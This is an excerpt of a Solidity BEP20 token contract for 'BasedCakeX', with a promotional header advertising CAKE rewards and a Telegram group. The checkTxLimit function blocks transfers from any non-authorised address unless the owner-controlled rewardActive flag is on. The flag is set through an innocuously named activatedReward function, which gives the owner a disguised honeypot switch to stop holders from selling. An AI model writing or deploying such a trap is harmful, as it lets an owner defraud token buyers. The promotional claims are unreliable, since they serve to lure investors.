...
/*
    ...
    Missed FegX  and the other legit degen project? Don't miss BasedCakeX get CAKE reward for just holding

    7% CAKE Rewards for holding $BasedCakeX
    5% Goes to liquidity
    6% Marketing (~2% to based team)
    
    
    TG: https://t.me/basedcakex
...
contract BasedCakeX is IBEP20, Auth {
    using SafeMath for uint256;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    
    address MarketingWallet = 0xEAc6a24834D3d17A87cc33748d5E13Ad06A8fbd1;

    string constant _name = "BasedCakeX";
    string constant _symbol = "BasedCakeX";
    ...
    function checkTxLimit(address sender, uint256 amount) internal view {
        ...
        require(rewardActive || authorizations[sender], "Reward Active");
    }
    ...
    function activatedReward(bool _status) public onlyOwner {
        rewardActive = _status;
    }
